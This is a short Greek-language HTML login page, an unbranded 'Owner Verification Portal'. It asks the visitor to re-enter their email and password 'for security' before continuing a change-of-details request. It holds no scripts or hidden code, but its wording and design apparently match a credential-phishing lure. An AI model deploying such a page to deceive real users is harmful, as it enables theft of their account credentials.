<!DOCTYPE html>
<html lang="el">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Είσοδος στην Υπηρεσία Επιβεβαίωσης</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
    <style>
        body { background: #2c3e50; height: 100vh; display: flex; align-items: center; justify-content: center; }
        .login-box { background: white; padding: 40px; border-radius: 10px; box-shadow: 0 15px 25px rgba(0,0,0,0.3); width: 100%; max-width: 400px; }
        .security-icon { font-size: 50px; color: #e67e22; text-align: center; display: block; margin-bottom: 20px; }
        .btn-verify { background: #e67e22; border: none; color: white; }
        .btn-verify:hover { background: #d35400; }
    </style>
</head>
<body>
    <div class="login-box">
        <div class="security-icon">🔒</div>
        <h4 class="text-center mb-4">Πύλη Επιβεβαίωσης Κατόχου</h4>
        <p class="small text-muted text-center mb-4">Για την ασφάλειά σας, παρακαλούμε συνδεθείτε ξανά για να συνεχίσετε στο αίτημα αλλαγής στοιχείων.</p>
        
        <form method="POST">
            <div class="mb-3">
                <label class="form-label">Email Λογαριασμού</label>
                <input type="email" name="email" class="form-control" required>
            </div>
            <div class="mb-3">
                <label class="form-label">Κωδικός Πρόσβασης</label>
                <input type="password" name="password" class="form-control" required>
            </div>
            <button type="submit" class="btn btn-verify w-100 py-2">Είσοδος & Επιβεβαίωση</button>
        </form>
    </div>
</body>
</html>
